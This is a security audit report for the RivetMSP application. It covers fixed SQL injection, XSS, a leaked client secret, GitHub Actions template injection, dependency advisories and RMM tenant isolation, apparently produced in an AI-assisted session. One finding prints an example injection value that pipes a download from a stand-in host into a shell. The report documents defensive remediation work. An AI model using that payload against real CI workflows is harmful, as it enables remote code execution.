# RivetMSP Security Audit

**Scope:** RivetMSP (`rivetmsp-beta`), `beta` branch tip `af8f4c395` plus this audit's own branch `msp-security-audit-docs`.
**Covers two passes:**
1. The original Aikido-scanner remediation pass (branches `msp-security-aikido` / `msp-security-sqli` / `msp-security-rce-xss`, merged into `beta` at `f42202b33` / `8ce1e4a4b` / `bdd0a754f`, plus two later follow-ups `9bbb713b8` and `9a45faabd`), completed and merged earlier in this session.
2. This audit (2026-10-26): re-verification of pass 1's fixes against the current `beta` tip, plus genuinely new work - GitHub Actions workflow hardening, a broader shared-JS XSS sweep, an explicit RMM tenant-isolation adversarial test, and a composer/JS dependency audit.

Findings are organized Critical → High → Medium → Low. Each carries **Location**, **Risk**, **Confidence** (Confirmed / High Confidence / Possible / False Positive), and **Status** (Fixed / Mitigated / False Positive / Unresolved).

---

## CRITICAL

### C1. SQL injection sweep (4 genuine injections across ~6,770 query call sites)
- **Location:** recurring-invoice frequency (cron + force-send INTERVAL), global search ticket-prefix lookup, `includes/class_unifi_sync_mapper.php` (`UnifiSyncMapper::findExistingAsset()`, controller-reported MAC), Tactical RMM check-id lookup.
- **Risk:** unauthenticated-adjacent or low-privilege-triggerable SQL injection via unbound values reaching query strings; worst case is data exfiltration or a boolean/stacked-query breakout.
- **Confidence:** Confirmed (taint-traced from source to sink, each independently exploitable before the fix).
- **Status:** **Fixed** (pass 1, commit `8ce1e4a4b` / `msp-security-sqli`). **Verified this pass**: `tests/security_sqli.php` run fresh against a schema-only scratch database - 25/25 assertions pass, including the UniFi MAC-binding proof (an always-true or UNION MAC payload matches no asset, raises no SQL error, and `users` survives a stacked `DROP TABLE` attempt), the recurring-invoice INTERVAL allow-list, and the certificate add/edit second-order path (an injection payload in the certificate name is stored verbatim as data, not executed, and the change-history row is still written).
- Hardened further (defense-in-depth, not because they were reachable): `admin/users.php` and `agent/certificate.php` moved to prepared statements; `logAction()` - the shared audit function called roughly 900 times across the codebase - converted to a prepared statement so every caller's type/action/description/IP/user-agent is bound rather than concatenated.

### C2. Second-order SQL injection in invoice/quote number prefix settings
- **Location:** the settings `INSERT` that stores the invoice/quote number prefix.
- **Risk:** an admin-controlled settings field reached a later `INSERT` unescaped.
- **Confidence:** Confirmed.
- **Status:** **Fixed** (commit `9a45faabd`, already in `beta` history prior to this audit). Confirmed as an ancestor of this audit's branch via `git merge-base --is-ancestor`; covered by the same `tests/security_sqli.php` run (the certificate add/edit second-order assertions exercise the identical code pattern - a change-history/audit row surviving a payload intact).

### C3. predis/predis CRLF command-injection (GHSA-v32q-pmmw-cf38 / GHSA-w6f5-v2h6-g786)
- **Location:** `composer.json` / `vendor/predis/predis`.
- **Risk:** CRLF injection into Redis protocol commands via unsanitized values, allowing command smuggling against the Redis backend.
- **Confidence:** Confirmed (known CVE, vendored version was in the affected range).
- **Status:** **Fixed** (pass 1). `composer.json` requires `predis/predis: ^3.7`; `composer.lock` / `vendor/predis/predis` is installed at **3.7.0**. Re-confirmed this pass: the advertised upstream fix landed in the 3.3.0 changelog note but the *real* fix is in 3.6.1 - 3.7.0 is comfortably past both. `composer audit --no-interaction` run fresh this pass: **"No security vulnerability advisories found."**

### C4. TinyMCE 8.5.0 - three stored-XSS CVEs (FIXED - upgraded to 8.5.1)
- **Location:** `plugins/tinymce/` (vendored, no `package.json`/lockfile; version read from the bundle's own `majorVersion:"8",minorVersion:"5.0"`).
- **Risk:** CVE-2026-47759, CVE-2026-47761, CVE-2026-47762 - stored XSS via crafted `data-mce-href` / `data-mce-src` / `data-mce-style` attributes and forged `mce:protected` comments that survive TinyMCE's own HTML serialization and execute when the content is reloaded into the editor or rendered. GitLab rates two of the three 8.7 (High); all three are fixed upstream in 8.5.1.
- **Reachability check performed:** the `media` plugin (CVE-2026-47761's specific trigger) is **not** enabled anywhere `tinymce.init()` is called in this app (`js/app.js`, `admin/settings_mail_templates.php`, `client/includes/footer.php` all load only `link image lists table code codesample fullscreen autoresize`-class plugin sets). However, the **`code` plugin is enabled on nearly every instance** (ticket replies, KB articles, mail templates, docs) - that gives any user with editor access a "View source" box to type the crafted `data-mce-*` attributes that CVE-2026-47759 (core serializer, plugin-independent) describes directly. This was assessed as **reachable**, not merely theoretical.
- **Confidence:** High Confidence (advisory-confirmed version match plus a verified-reachable attack surface in this app).
- **Status:** **Fixed.** `plugins/tinymce/` upgraded to the official **8.5.1** self-hosted bundle (the only 8.5.x patch release; it carries exactly the three stored-XSS fixes matching these CVEs - two core-serializer fixes plus the `media` plugin `data-mce-object` fix). Provenance verified against the npm registry's recorded sha1/sha512 for the official `tinymce@8.5.1` package (published by Tiny Technologies' own npm account, `repository` pointing at `github.com/tinymce/tinymce`) before swapping in the bundle - see `MSP_REMEDIATION_REPORT.md` item 1 for the exact verification steps and smoke-test results.

---

## HIGH

### H1. Azure AD / Entra client secret echoed decrypted to the browser
- **Location:** `admin/identity_provider.php` (Administration > Identity Providers).
- **Risk:** the live, decrypted OAuth client secret was rendered into the input's `value=""` attribute on every page load - recoverable via view-source, a malicious browser extension, a shoulder-surf, or any future XSS on that page.
- **Confidence:** Confirmed (this was a *different, worse* issue than the "Azure client secret" finding Aikido originally flagged - the literally-named secret-handling files were already correct; this was found by deliberately looking past the named finding).
- **Status:** **Fixed** (pass 1). **Verified this pass**: `tests/security_identity_provider.php` run fresh over real HTTP (forged admin session, `php -S`, scratch DB) - 11/11 assertions pass: the stored secret never appears anywhere in the rendered page; the field is always blank with a "a secret is already configured" placeholder; saving with the field left blank keeps the existing secret unchanged; saving with a new value replaces it; the (already-sanitized) client-id field round-trips HTML-escaped.

### H2. GitHub Actions workflow template injection (NEW this pass, FIXED)
- **Location:** `.github/workflows/core-conformance.yml`, the "Check out rivet-core" step.
- **Risk:** `REF="${{ github.event.inputs.core_ref }}"` interpolated the `workflow_dispatch` input directly into a `run:` shell block. Because `${{ }}` substitution happens before the shell parses the script, a value like `$(id)\"; curl evil | sh #` becomes literal shell code, not just a tainted variable - the classic GitHub Actions template-injection class. Mitigated in practice by `workflow_dispatch` requiring repo-write access to trigger at all, but still a real injection primitive and exactly the pattern the newer request asked to be swept for.
- **Confidence:** Confirmed (exact pattern match; all 4 workflow files were audited for `${{ github.event`/`github.head_ref` style expressions - this was the only hit).
- **Status:** **Fixed** this pass (commit `a1b0c6a87`). The input now passes through `env: CORE_REF_INPUT: ${{ github.event.inputs.core_ref }}` and the shell reads `$CORE_REF_INPUT`, so a malicious value is just a string, never re-parsed as shell syntax.
- **Also checked, no action needed:** `permissions:` blocks are already least-privilege (`contents: read` on `core-conformance.yml`, `php-lint.yml`, `dbsql-lint.yml`; `issues: write, pull-requests: write` on `first-interaction.yml`, which is exactly what it needs to post its own welcome comment). `first-interaction.yml` uses `pull_request_target` but **never checks out the PR's code** - it only invokes `actions/first-interaction@v1.2.0` to post a fixed welcome message - so the "checkout untrusted PR + run with elevated token" supply-chain pattern does not apply here.

### H3. Credential detail/edit modal reveal-audit bypass
- **Location:** credential detail/edit modals (roadmap item #9).
- **Risk:** opening the edit form pre-filled a credential's password without the same audit trail the explicit "reveal" button produced, letting a technician see a secret without it being logged.
- **Confidence:** Confirmed.
- **Status:** **Fixed** (commit `9bbb713b8`, in `beta` history prior to this audit). Confirmed as an ancestor of this audit's branch. **Verified this pass**: `tests/security_vault_reveal.php` run fresh - 71/71 assertions pass (reproducibly, across two consecutive runs; one earlier run showed a single flaky failure consistent with an HTTP-harness timing race, not a logic failure) - covering: merely opening the detail modal reveals and logs nothing; the reveal button goes through the real audited endpoint; opening the edit form writes exactly one Credential Reveal log entry, attributed correctly, never containing the secret value itself; a credential with nothing to reveal logs nothing new; a refused/failed request writes no reveal event.

### H4. exec()/RCE sweep - whois option injection and git-command argument escaping
- **Location:** shell-invoking call sites across the first-party codebase (whois lookup, git commands).
- **Risk:** unescaped values reaching `exec()`/`shell_exec()`/`popen()`-family calls; the whois case specifically allowed option injection via a crafted lookup target.
- **Confidence:** Confirmed for the whois and git-argument cases. PHPMailer's `popen()` was investigated and found to be **unreachable vendored code**, not a real issue (false positive, documented below under Medium for completeness of the chain).
- **Status:** **Fixed** (pass 1). **Verified this pass**: `tests/no_unsafe_shell.php` run fresh - **PASS: 35 shell call(s) in 138 first-party PHP file(s) use only literals, constants and escaped values (5 reviewed exception(s))**.

### H5. XSS via `window.location.href` and other navigation sinks (8 named sites + broader sweep)
- **Location (pass 1):** `admin/debug.php`, `agent/alerts.php`, `agent/asset_details.php`, `agent/includes/rmm_scripts_synced.php`, `agent/rmm_alerts.php`, `agent/rmm_dashboard.php`, `agent/js/tickets_kanban.js`, `js/confirm_modal.js`, `js/event_rules.js`, `js/rmm_launch.js`, `js/webauthn_signin.js`, `js/webhook_form.js`, `setup/index.php`.
- **Risk:** a computed value reaching `window.location.href` (or a PHP `redirect()` fallback) without validation, letting an attacker redirect to a `javascript:`/`data:` URL or break out of the originating script. One site (named in pass 1's own notes) was **proven exploitable via a real headless-Chrome test before the fix**, not just pattern-matched.
- **Confidence:** Confirmed.
- **Status:** **Fixed** (pass 1; 7 of 8 named sites hardened, the 8th was the one proven-then-fixed). **Verified this pass**: `tests/no_unsafe_navigation.php` run fresh - **PASS: 200 first-party file(s) that touch location: every navigation target is a literal, encoded or reviewed, and no page URL is rendered as HTML (11 reviewed site(s))**.
- **Broader sweep performed this pass** (the newer request's explicit ask: don't assume the 8 named sites were exhaustive), across every first-party `.js` file plus the 6 shared JS files vendored from `rivet/rivet-core` (`vendor/rivet/rivet-core/assets/ui/js/*.js` - these ship to **both** RivetMSP and RivetIT, so a finding here would be a cross-edition finding):
  - `innerHTML`/`outerHTML`/`insertAdjacentHTML`: every first-party and shared-vendor occurrence traced to its data source. All either assign static string literals, clone a same-page `<template>` element with only a numeric index substituted (the standard "add row" idiom in `js/rmm_alr.js`, `js/rmm_automation.js`, `js/rmm_checks_simple.js`, `js/rmm_scale.js`), or assign a server-rendered fragment that the PHP side escapes with `rmmH()`/`nullable_htmlentities()` before it ever reaches the response (verified by reading the PHP source of each fragment-building function: `rivetRmmScrTagChips()`, `rivetRmmScrParamInputs()`, `rivetRmmAutoInstallCheckboxes()`, the ticket-collision-viewer message in `agent/ajax.php`). **No new finding.**
  - `document.write()` / bare `eval(` / `new Function(`: only appear inside third-party vendored libraries (`plugins/dropzone`, `plugins/pdfmake`), never in first-party code. Not in this audit's authorship scope; see dependency audit below.
  - `location.replace()`/`location.assign()`: `js/rmm_launch.js` (already hardened in pass 1 - validates `protocol === 'https:' || 'http:'` before navigating) and `vendor/rivet/rivet-core/assets/ui/js/webhook_wizard.js` (shared code) - the latter independently validates same-origin (`target.origin !== location.origin` rejects) and strips the scheme/host before calling `location.assign()`, the same defensive pattern as the already-fixed file. **No new finding.**
  - jQuery `$()` constructor/selector confusion (`$(attacker_string)`): no occurrence found where `$()` wraps anything other than a DOM element, `this`, `document`, or a literal selector string. **No new finding.**
  - `.html()` (jQuery): the only first-party occurrence (`agent/js/ticket_change_client.js`) assigns static literal strings ("Loading...", "Failed to load contacts"). **No new finding.**

---

## MEDIUM

### M1. Historical backup-dump SQL files in git history
- **Location:** two backup-dump `.sql` files, removed from the working tree in 2024.
- **Risk:** if they ever contained production data, that data is still reachable by anyone who clones the full git history, even though the files are gone from HEAD.
- **Confidence:** Confirmed absent from the current tree; history exposure is a documentation/decision matter, not a live code defect.
- **Status:** **Mitigated, not resolved** - confirmed this pass still absent from `HEAD` of `beta`. `.gitignore` was hardened (pass 1) to block recurrence. **History was deliberately NOT scrubbed**, per explicit prior instruction not to rewrite git history without the user's authorization. This remains an open decision for Blake - see `MSP_REMEDIATION_REPORT.md`.

### M2. pdfmake vendored but unreferenced (dead code)
- **Location:** `plugins/pdfmake/pdfmake.min.js`.
- **Risk:** none currently - grepped across the entire repo (excluding its own directory and `vendor/`), the only other reference is a changelog line noting a historical version bump (0.2.8 → 0.2.18). No PHP template or JS file includes `plugins/pdfmake/pdfmake.min.js` via a `<script>` tag or dynamic loader; it is not reachable on any page.
- **Confidence:** Confirmed unreachable (False Positive for exploitability), but flagged because dead vendored code is maintenance debt and the bundled version string doesn't map cleanly to pdfmake's own release numbering (likely an internal sub-dependency's version, not pdfmake's), making it hard to audit if it's ever wired back up without re-verifying first.
- **Status:** **False Positive** (no live risk). Recommend removing the unused file in a future cleanup pass rather than carrying stale, unreferenced third-party code.

### M3. Composer / JS dependency audit (new this pass)
- `composer audit --no-interaction`: **clean**, 0 advisories.
- No `package.json`/npm lockfile exists in this repo - all browser JS libraries are vendored directly under `plugins/` (or `vendor/rivet/rivet-core/assets/`). Versions were read from each bundle's own embedded version string and checked individually:

  | Library | Version found | Result |
  |---|---|---|
  | jQuery | 3.7.1 | No known CVE |
  | Bootstrap | 5.3.3 | No known CVE |
  | TinyMCE | 8.5.1 | Fixed - see C4 |
  | Select2 | 4.0.13 | Past the only relevant CVE (CVE-2016-10744, fixed ≤4.0.6) |
  | DataTables | 2.3.7 | No advisory found |
  | Dropzone.js | 5.9.3 | No CVE found in the library's own runtime code (one unrelated Drupal packaging note about its *build tooling*, not applicable here) |
  | FullCalendar | 6.1.20 | No advisory found |
  | intl-tel-input | 25.3.0 | No advisory found |
  | Litepicker | 2.0.12 | No advisory found |
  | Tom Select | 2.6.2 | No advisory found |
  | Tempus Dominus | 6.10.4 | No advisory found |
  | pdfmake | ambiguous (dead code) | See M2 |

  "No advisory found" means a targeted web search returned no CVE/GHSA match for that exact version - it is evidence of absence, not proof; these were not independently re-derived from source.

---

## LOW

### L1. TOTP seed in test fixtures is the textbook RFC 6238 example seed
- **Status:** **False Positive.** `JBSWY3DPEHPK3PXP` and similar are the standard RFC 6238/Google Authenticator demo seeds used across the industry's own test suites; they are test fixtures, not live secret material.

### L2. `test.php`
- **Status:** **False Positive.** Does not exist anywhere in the current tree.

### L3. `click_admin.json`
- **Status:** **False Positive.** Synthetic QA fixture data, not real user or client data.

### L4. Android `google-services.json`
- **Status:** **False Positive / Not applicable to this repo.** Per prior session finding, this file is intentionally public per Google's own documentation; the key inside it is not a secret and must not be untracked.

---

## INFORMATIONAL - explicit tenant-isolation / RMM-agent-impersonation verification (new this pass)

**Question:** can one MSP client's RMM agent authenticate as, or submit data under, a different client's device/tenant context?

**Answer: no**, by design, verified dynamically over real HTTP in `tests/rmm_tenant_isolation.php` (new, 23/23 assertions passing):

- A device's client/tenant binding comes **only** from the SHA-256 hash of its bearer token, looked up against `endpoint_agent_devices.client_id` (`RivetCore\Rmm\Device\DeviceRepository::authenticate()`, using `hash_equals()` for constant-time comparison). No device-facing endpoint (`agent_checkin`, `agent_jobs`, `agent_logs`, `agent_changes`) reads a client or device identifier from the request body at all - the wire protocol simply does not define one. A forged `device_id`/`client_id` field in a check-in body was sent and confirmed to have zero effect: only the authenticated device's own row changed.
- Jobs are strictly scoped server-side: `JobService::offer()` and `JobService::report()` both filter `WHERE device_id = ?` using the *credential's* device id, never a request-supplied one. A job queued for client B's device was confirmed never offered to client A's credential, and a forged report of B's real `job_id` via A's credential was refused (A's own device has no such job) and left B's job state untouched.
- Enrollment-time identity reuse (the "cloned image" / stolen hardware-fingerprint scenario) does not hijack another client's device: enrolling a new device under client B's token while claiming the exact same hardware serial as an existing client A device creates a **new**, separate device row under client B - the token's own client - and leaves client A's original device row and credential completely unchanged (confirmed: different `device_id`, `token_hash` byte-identical before/after, original credential still checks in normally afterward).
- A raw enrollment token is refused as a device check-in credential (401 `invalid_token`), and a garbage bearer token is refused the same way - credential *kinds* are not confused with each other either.

This is the same underlying design the earlier session's Panel API / device-token work (`msp-panel-api`, DB 2.6.111) relies on; this test is net-new coverage of the specific cross-tenant-impersonation angle, distinct from the human-technician authorization matrix already covered by `tests/endpoint_agent_smoke.php`.
